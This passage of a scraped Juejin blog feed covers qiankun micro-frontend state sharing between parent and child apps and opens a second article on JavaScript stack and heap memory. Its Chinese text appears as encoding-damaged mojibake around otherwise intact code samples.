  instance.<span class="hljs-property">config</span>.<span class="hljs-property">globalProperties</span>.<span class="hljs-property">__SUBAPP__</span> = props <span class="hljs-comment">//vue3çš„globalPropertieså…¨å±€æŒ‚è½½</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">__SUBAPP__</span> = props <span class="hljs-comment">//æŒ‚è½½åˆ°å­åº”ç”¨çš„windowå¯¹è±¡</span>

  instance.<span class="hljs-title function_">mount</span>(container)
}
</code></pre>
<p>å­åº”ç”¨çš„å…¶ä»–ç»„ä»¶ä½¿ç”¨æ—¶</p>
<pre><code class="hljs language-vue" lang="vue">//å­åº”ç”¨ sub-app1/src/components/HelloWord.vue
&lt;script setup&gt;
    import { ref,getCurrentInstance } from 'vue'

    defineProps({
      msg: String,
    })

    const count = ref(0)
    console.log('windowæ–¹å¼è·å–æ•°æ®',window.__SUBAPP__)
    console.log('getCurrentInstanceæ–¹å¼è·å–æ•°æ®', getCurrentInstance().proxy.__SUBAPP__)
&lt;/script&gt;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cbf279e34fe948c68c97eb9319cc61d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omR5qOx6Ju-5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939959&amp;x-signature=wsRXckjYn42o33dljKuRFvmvXj0%3D" alt="image-20251208221830086" loading="lazy"/></p>
<h4 data-id="heading-27"><strong>initGlobalState</strong></h4>
<h5 data-id="heading-28">çˆ¶-&gt;å­ä¼ é€’</h5>
<p>é¦–å…ˆåœ¨çˆ¶åº”ç”¨ä¸­åˆ›å»ºä¸€ä¸ª<code>globalState.js</code>åˆå§‹åŒ–ä¸€ä¸‹state</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">//main-app/globalState.js</span>
<span class="hljs-keyword">import</span> { initGlobalState } <span class="hljs-keyword">from</span> <span class="hljs-string">'qiankun'</span>;

<span class="hljs-comment">// å®šä¹‰åˆå§‹çŠ¶æ€</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> initialState = {
  <span class="hljs-attr">user</span>: { <span class="hljs-attr">id</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">token</span>: <span class="hljs-string">''</span> },
  <span class="hljs-attr">globalConfig</span>: { <span class="hljs-attr">theme</span>: <span class="hljs-string">'light'</span>, <span class="hljs-attr">language</span>: <span class="hljs-string">'zh-CN'</span> },
  <span class="hljs-attr">sharedData</span>: {},
  <span class="hljs-attr">currentRoute</span>: {}
};

<span class="hljs-comment">// å½“å‰å…¨å±€çŠ¶æ€</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> currentGlobalState = { ...initialState };

<span class="hljs-comment">// å…¨å±€çŠ¶æ€ç®¡ç†å™¨å®ä¾‹</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> globalActions = <span class="hljs-literal">null</span>;

<span class="hljs-comment">// åˆå§‹åŒ–å…¨å±€çŠ¶æ€ç®¡ç†</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">initGlobalStateManager</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// åˆå§‹åŒ– state</span>
  <span class="hljs-keyword">const</span> actions = <span class="hljs-title function_">initGlobalState</span>(initialState);
  
  <span class="hljs-comment">// ç›‘å¬çŠ¶æ€å˜æ›´</span>
  actions.<span class="hljs-title function_">onGlobalStateChange</span>(<span class="hljs-function">(<span class="hljs-params">state, prev</span>) =&gt;</span> {
    currentGlobalState = { ...state };
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ä¸»åº”ç”¨ï¼šå…¨å±€çŠ¶æ€å˜æ›´'</span>, { <span class="hljs-attr">newState</span>: state, <span class="hljs-attr">prevState</span>: prev });
  });
  
  <span class="hljs-comment">// è®¾ç½®åˆå§‹çŠ¶æ€</span>
  actions.<span class="hljs-title function_">setGlobalState</span>(initialState);
  
  globalActions = actions;
  <span class="hljs-keyword">return</span> actions;
};

<span class="hljs-comment">// æ›´æ–°å…¨å±€çŠ¶æ€</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">updateGlobalState</span> = (<span class="hljs-params">newState</span>) =&gt; {
  <span class="hljs-keyword">if</span> (!globalActions) {
    globalActions = <span class="hljs-title function_">initGlobalStateManager</span>();
  }
  globalActions.<span class="hljs-title function_">setGlobalState</span>(newState);
};


</code></pre>
<p>å…¶ä¸­å…³é”®æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å®šä¹‰åˆå§‹çŠ¶æ€</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> initialState = {
  <span class="hljs-attr">user</span>: { <span class="hljs-attr">id</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">token</span>: <span class="hljs-string">''</span> },
  <span class="hljs-attr">globalConfig</span>: { <span class="hljs-attr">theme</span>: <span class="hljs-string">'light'</span>, <span class="hljs-attr">language</span>: <span class="hljs-string">'zh-CN'</span> },
  <span class="hljs-attr">sharedData</span>: {},
  <span class="hljs-attr">currentRoute</span>: {}
};
<span class="hljs-comment">//åˆå§‹åŒ– state</span>
<span class="hljs-keyword">const</span> actions = <span class="hljs-title function_">initGlobalState</span>(initialState);	
<span class="hljs-comment">// ç›‘å¬çŠ¶æ€å˜æ›´</span>
actions.<span class="hljs-title function_">onGlobalStateChange</span>(<span class="hljs-function">(<span class="hljs-params">state, prev</span>) =&gt;</span> {
    currentGlobalState = { ...state };
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ä¸»åº”ç”¨ï¼šå…¨å±€çŠ¶æ€å˜æ›´'</span>, { <span class="hljs-attr">newState</span>: state, <span class="hljs-attr">prevState</span>: prev });
});
<span class="hljs-comment">// æ›´æ–°å…¨å±€çŠ¶æ€</span>
actions.<span class="hljs-title function_">setGlobalState</span>(newState);
<span class="hljs-comment">// å–æ¶ˆç›‘å¬</span>
actions.<span class="hljs-title function_">offGlobalStateChange</span>();

</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// main-app/login.vue</span>
<span class="hljs-keyword">import</span> { updateGlobalState } <span class="hljs-keyword">from</span> <span class="hljs-string">'./globalState'</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> =(<span class="hljs-params"/>)=&gt;{
  <span class="hljs-comment">// ã€‚ã€‚ã€‚ä¸»åº”ç”¨çš„ä¸šåŠ¡é€»è¾‘</span>
  <span class="hljs-comment">// æ›´æ–°state  </span>
  <span class="hljs-title function_">updateGlobalState</span>({
      <span class="hljs-attr">isLoggedIn</span>: <span class="hljs-literal">true</span>,
    });
}
</code></pre>
<p>åœ¨å­åº”ç”¨ä¸­ç›‘å¬</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// sub-app1/main.js</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">props = {}</span>) {
  <span class="hljs-keyword">const</span> container = props.<span class="hljs-property">container</span> || <span class="hljs-string">'#app'</span>

  instance = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
  
  <span class="hljs-comment">// ç›‘å¬å…¨å±€çŠ¶æ€å˜åŒ–</span>
  <span class="hljs-comment">//props é‡Œé¢æœ‰setGlobalStateå’ŒonGlobalStateChange æ–¹æ³•ï¼Œå¯ç”¨äºç›‘å¬å’Œä¿®æ”¹çŠ¶æ€ </span>
  <span class="hljs-keyword">if</span> (props.<span class="hljs-property">onGlobalStateChange</span>) {
    props.<span class="hljs-title function_">onGlobalStateChange</span>(<span class="hljs-function">(<span class="hljs-params">state, prev</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­å˜æ›´åçš„çŠ¶æ€'</span>, state, <span class="hljs-string">'å­å˜æ›´å‰çš„çŠ¶æ€'</span>, prev);
    });
  }
  <span class="hljs-comment">// æŒ‚è½½ä¸€ä¸‹propsï¼Œä»¥ä¾¿äºåœ¨å…¶ä»–ç»„ä»¶ä¸­ä½¿ç”¨setGlobalStateå’ŒonGlobalStateChange</span>
  <span class="hljs-comment">// æŒ‚è½½çš„æ–¹å¼æœ‰å¾ˆå¤šï¼Œ piniaç­‰ï¼Œæ€»ä¹‹å…¶ä»–åœ°æ–¹èƒ½è·å–åˆ°propså¯¹è±¡å°±è¡Œ  </span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">__SUBAPP__</span> = props
  pinia = <span class="hljs-title function_">createPinia</span>()
  instance.<span class="hljs-title function_">use</span>(pinia)
  instance.<span class="hljs-title function_">mount</span>(container)
}
</code></pre>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef53aace976646fe93b6b05b904cd7b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omR5qOx6Ju-5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939959&amp;x-signature=lMpZUaJ3pKN%2BYL%2FafoBo4AnlEV4%3D" alt="image-20251209221654305" loading="lazy"/>
<h5 data-id="heading-29">å­-&gt;çˆ¶ä¼ é€’</h5>
<p>åœ¨å­åº”ç”¨åˆ›å»ºçš„æ—¶å€™ï¼Œå·²ç»å°†<code>props</code>ä¿å­˜äº†<code>window.__SUBAPP__ = props</code>,åœ¨å­åº”ç”¨çš„ä»»ä½•ç»„ä»¶ä¸­éƒ½å¯ä»¥ä½¿ç”¨</p>
<p>æ‰€ä»¥åªéœ€è¦åœ¨æŸä¸ªç»„ä»¶ä¸­è°ƒç”¨<code>setGlobalState</code>æ–¹æ³•å°±å¯</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// sub-app1/HelloWord.vue</span>
<span class="hljs-comment">// è·å–å…¨å±€çŠ¶æ€ç®¡ç†æ–¹æ³•</span>
<span class="hljs-keyword">const</span> { setGlobalState } = <span class="hljs-variable language_">window</span>.<span class="hljs-property">__SUBAPP__</span> || {}
<span class="hljs-keyword">if</span> (setGlobalState) {
	<span class="hljs-comment">// æ›´æ–°å…¨å±€çŠ¶æ€</span>
    <span class="hljs-title function_">setGlobalState</span>({
      <span class="hljs-attr">sharedData</span>: {
        <span class="hljs-attr">count</span>: newValue
      }
    })
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ac73b829329421886daa6636c6fc65d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omR5qOx6Ju-5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939959&amp;x-signature=rR5Te%2FS54JZtXWDoHNqktz0iQlo%3D" alt="image-20251209222325435" loading="lazy"/></p>
<h2 data-id="heading-30">å¾®å‰ç«¯é€‰å‹æŒ‡å—ï¼šä½•æ—¶ç”¨ï¼Ÿç”¨å“ªä¸ªï¼Ÿ</h2>
<h3 data-id="heading-31">é€‚åˆåœºæ™¯ âœ…</h3>
<ul>
<li>å¤§å‹ä¼ä¸šçº§åº”ç”¨ï¼ˆ100+é¡µé¢ï¼‰</li>
<li>å¤šå›¢é˜Ÿåä½œå¼€å‘ï¼ˆ3+å‰ç«¯å›¢é˜Ÿï¼‰</li>
<li>è€ç³»ç»Ÿæ¸è¿›å¼é‡æ„</li>
<li>éœ€è¦æ”¯æŒå¤šæŠ€æœ¯æ ˆ</li>
<li>ç‹¬ç«‹éƒ¨ç½²éœ€æ±‚å¼ºçƒˆ</li>
<li/>
</ul>
<h3 data-id="heading-32">ä¸é€‚åˆåœºæ™¯ âŒ</h3>
<ul>
<li>å°å‹é¡¹ç›®ï¼ˆé¡µé¢&lt;20ï¼‰</li>
<li>å•äºº/å°å›¢é˜Ÿå¼€å‘</li>
<li>å¯¹æ€§èƒ½è¦æ±‚æè‡´ï¼ˆé¦–å±åŠ è½½æ—¶é—´&lt;1sï¼‰</li>
<li>æ— æŠ€æœ¯æ ˆå¼‚æ„éœ€æ±‚</li>
</ul>
<h2 data-id="heading-33">ç»“è¯­</h2>
<p><strong>åƒä¸‡ä¸è¦æ‰‹é‡Œæ”¥ç€é”¤å­çœ‹å•¥éƒ½åƒé’‰å­ã€‚</strong>
å¾®å‰ç«¯ä¸æ˜¯é“¶å¼¹ï¼Œè€Œæ˜¯ä¸€ç§æ¶æ„é€‰æ‹©ã€‚å®ƒç”¨å¤æ‚åº¦æ¢æ¥äº†çµæ´»æ€§ã€ç‹¬ç«‹æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚å°±åƒä¹é«˜ç§¯æœ¨ï¼Œå•ä¸ªæ¨¡å—ç®€å•ï¼Œä½†ç»„åˆèµ·æ¥å´èƒ½æ„å»ºå‡ºæ— é™å¯èƒ½çš„ä¸–ç•Œã€‚</p>
<p>åç»­æœ‰æ—¶é—´å°†ç»§ç»­æ·±å…¥å­¦ä¹ ä¸€ä¸‹å¾®å‰ç«¯çš„<code>ç”Ÿå‘½å‘¨æœŸã€æ ·å¼éš”ç¦»ã€éƒ¨ç½²å‘å¸ƒ</code>è¿™å‡ ä¸ªéƒ¨åˆ†ã€‚</p>
<p>æœ€åï¼Œè§‰å¾—æœ‰ç”¨çš„è¯ä¸‰è¿ä¸€ä¸‹~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ JavaScript å†…å­˜æœºåˆ¶ï¼šä»è°ƒç”¨æ ˆåˆ°é—­åŒ…ï¼Œä¸€æ–‡è®²é€ï¼]]></title>    <link>https://juejin.cn/post/7581750253000687651</link>    <guid>https://juejin.cn/post/7581750253000687651</guid>    <pubDate>2025-12-10T02:52:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581750253000687651" data-draft-id="7581786379803361315" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ JavaScript å†…å­˜æœºåˆ¶ï¼šä»è°ƒç”¨æ ˆåˆ°é—­åŒ…ï¼Œä¸€æ–‡è®²é€ï¼"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-12-10T02:52:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”Ÿæ¤°ä¸ç»’æ‹¿é“"/> <meta itemprop="url" content="https://juejin.cn/user/4185180725584116"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ JavaScript å†…å­˜æœºåˆ¶ï¼šä»è°ƒç”¨æ ˆåˆ°é—­åŒ…ï¼Œä¸€æ–‡è®²é€ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4185180725584116/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”Ÿæ¤°ä¸ç»’æ‹¿é“
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:52:45.000Z" title="Wed Dec 10 2025 02:52:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œæˆ‘ä»¬å†™ JavaScript ä»£ç æ—¶å‡ ä¹ä¸éœ€è¦å…³å¿ƒå†…å­˜åˆ†é…ã€å›æ”¶è¿™äº›åº•å±‚ç»†èŠ‚ã€‚ä½†ä½ æ˜¯å¦æ›¾å¥½å¥‡è¿‡ï¼š</p>
<ul>
<li>ä¸ºä»€ä¹ˆ <code>let a = 1; let b = a; a = 2</code> åï¼Œ<code>b</code> è¿˜æ˜¯ 1ï¼Ÿ</li>
<li>ä¸ºä»€ä¹ˆå¯¹è±¡èµ‹å€¼åä¿®æ”¹ä¸€ä¸ªä¼šå½±å“å¦ä¸€ä¸ªï¼Ÿ</li>
<li>é—­åŒ…åˆ°åº•æ˜¯æ€ä¹ˆâ€œè®°ä½â€å¤–éƒ¨å˜é‡çš„ï¼Ÿ</li>
<li>JS æ˜¯å¦‚ä½•åšåˆ°â€œä¸ç”¨æ‰‹åŠ¨é‡Šæ”¾å†…å­˜â€çš„ï¼Ÿ</li>
</ul>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å°±ç»“åˆ V8 å¼•æ“çš„å®ç°åŸç†ï¼Œæ·±å…¥æµ…å‡ºåœ°èŠèŠ <strong>JavaScript çš„å†…å­˜æœºåˆ¶ä¸æ‰§è¡Œæ¨¡å‹</strong>ï¼Œæ­å¼€è¿™äº›å¸¸è§ç°è±¡èƒŒåçš„çœŸç›¸ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€JS æ˜¯ä»€ä¹ˆè¯­è¨€ï¼ŸåŠ¨æ€å¼±ç±»å‹ â‰  ä¸ä¸¥è°¨</h2>
<p>å…ˆæ¥çœ‹ä¸€æ®µä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">var bar<span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // "undefined"</span>
<span class="hljs-attr">bar</span> = <span class="hljs-number">12</span><span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // "number"</span>
<span class="hljs-attr">bar</span> = <span class="hljs-string">"æå®¢æ—¶é—´"</span><span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // "string"</span>
<span class="hljs-attr">bar</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // "boolean"</span>
<span class="hljs-attr">bar</span> = null<span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // "object" â† JS çš„å†å²æ€§ bugï¼</span>
<span class="hljs-attr">bar</span> = {name: <span class="hljs-string">"æå®¢æ—¶é—´"</span>}<span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // "object"</span>
</code></pre>
<p>è¿™æ®µä»£ç å±•ç¤ºäº† JavaScript çš„ä¸¤ä¸ªå…³é”®ç‰¹æ€§ï¼š</p>
<ul>
<li><strong>åŠ¨æ€ç±»å‹</strong>ï¼šå˜é‡ç±»å‹åœ¨è¿è¡Œæ—¶ç¡®å®šï¼Œæ— éœ€æå‰å£°æ˜ã€‚</li>
<li><strong>å¼±ç±»å‹</strong>ï¼šä¸åŒç±»å‹ä¹‹é—´å¯ä»¥éšå¼è½¬æ¢ï¼ˆå¦‚ <code>true == 1</code>ï¼‰ã€‚</li>
</ul>
<p>ä½†è¿™å¹¶ä¸æ„å‘³ç€ JS â€œä¸ä¸¥è°¨â€ã€‚æ°æ°ç›¸åï¼Œå®ƒçš„è®¾è®¡è®©å¼€å‘è€…æ›´èšç„¦äºé€»è¾‘è€Œéç±»å‹ç³»ç»Ÿã€‚è€Œè¿™ä¸€åˆ‡çš„èƒŒåï¼Œç¦»ä¸å¼€ä¸€å¥—ç²¾å¯†çš„ <strong>å†…å­˜ç®¡ç†æœºåˆ¶</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€å†…å­˜åˆ†ä¸¤å—ï¼šæ ˆ vs å †</h2>
<p>JavaScript å¼•æ“ï¼ˆå¦‚ V8ï¼‰å°†å†…å­˜åˆ†ä¸ºä¸¤ç±»ï¼š</p>




















<table><thead><tr><th>å†…å­˜åŒºåŸŸ</th><th>å­˜å‚¨å†…å®¹</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td><strong>æ ˆå†…å­˜ï¼ˆStackï¼‰</strong></td><td>ç®€å•æ•°æ®ç±»å‹ï¼ˆNumber, String, Boolean, undefined, Symbol, BigIntï¼‰</td><td>å¿«é€Ÿåˆ†é…/é‡Šæ”¾ï¼Œè¿ç»­ç©ºé—´ï¼Œå¤§å°å›ºå®š</td></tr><tr><td><strong>å †å†…å­˜ï¼ˆHeapï¼‰</strong></td><td>å¤æ‚æ•°æ®ç±»å‹ï¼ˆObject, Array, Function ç­‰ï¼‰</td><td>ç©ºé—´å¤§ä½†åˆ†é…/å›æ”¶æ…¢ï¼Œä¸è¿ç»­</td></tr></tbody></table>
<h3 data-id="heading-2">âœ… ç¤ºä¾‹ 1ï¼šåŸºæœ¬ç±»å‹ â€”â€” æ ˆå†…å­˜ä¸­çš„ç‹¬ç«‹æ‹·è´</h3>
<pre><code class="hljs language-ini" lang="ini">function foo() {
  var <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  var <span class="hljs-attr">b</span> = a<span class="hljs-comment">; // æ‹·è´å€¼</span>
  <span class="hljs-attr">a</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>
  console.log(a)<span class="hljs-comment">; // 2</span>
  console.log(b)<span class="hljs-comment">; // 1 â† ä¸å—å½±å“</span>
}
</code></pre>
<p>å› ä¸º <code>a</code> å’Œ <code>b</code> éƒ½æ˜¯åŸºæœ¬ç±»å‹ï¼Œå®ƒä»¬å„è‡ªåœ¨æ ˆä¸­æ‹¥æœ‰ç‹¬ç«‹çš„å­˜å‚¨ç©ºé—´ã€‚èµ‹å€¼æ˜¯<strong>å€¼æ‹·è´</strong>ï¼Œäº’ä¸å½±å“ã€‚</p>
<h3 data-id="heading-3">âœ… ç¤ºä¾‹ 2ï¼šå¼•ç”¨ç±»å‹ â€”â€” å †å†…å­˜ä¸­çš„å…±äº«æŒ‡é’ˆ</h3>
<pre><code class="hljs language-css" lang="css">function foo() {
  <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> = { name: <span class="hljs-string">"æå®¢æ—¶é—´"</span> };
  <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">b</span> = <span class="hljs-selector-tag">a</span>; // æ‹·è´çš„æ˜¯â€œå¼•ç”¨â€ï¼ˆæŒ‡é’ˆï¼‰
  <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.name</span> = 'æå®¢å¸®';
  console<span class="hljs-selector-class">.log</span>(<span class="hljs-selector-tag">a</span>); // { name: <span class="hljs-string">"æå®¢å¸®"</span> }
  console<span class="hljs-selector-class">.log</span>(<span class="hljs-selector-tag">b</span>); // { name: <span class="hljs-string">"æå®¢å¸®"</span> } â† è¢«åŒæ­¥ä¿®æ”¹ï¼
}
</code></pre>
<p>è¿™é‡Œ <code>a</code> å’Œ <code>b</code> åœ¨æ ˆä¸­åªä¿å­˜äº†æŒ‡å‘å †ä¸­åŒä¸€ä¸ªå¯¹è±¡çš„<strong>å¼•ç”¨åœ°å€</strong>ã€‚ä¿®æ”¹å¯¹è±¡å†…å®¹ï¼Œæ‰€æœ‰å¼•ç”¨éƒ½ä¼šçœ‹åˆ°å˜åŒ–ã€‚</p>
<blockquote>
<p>ğŸ’¡ <strong>å…³é”®ç†è§£</strong>ï¼šJS ä¸­æ²¡æœ‰â€œå¯¹è±¡å˜é‡â€ï¼Œåªæœ‰â€œå¯¹è±¡å¼•ç”¨â€ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">ä¸‰ã€æ‰§è¡Œä¸Šä¸‹æ–‡ä¸è°ƒç”¨æ ˆï¼šç¨‹åºè¿è¡Œçš„èˆå°</h2>
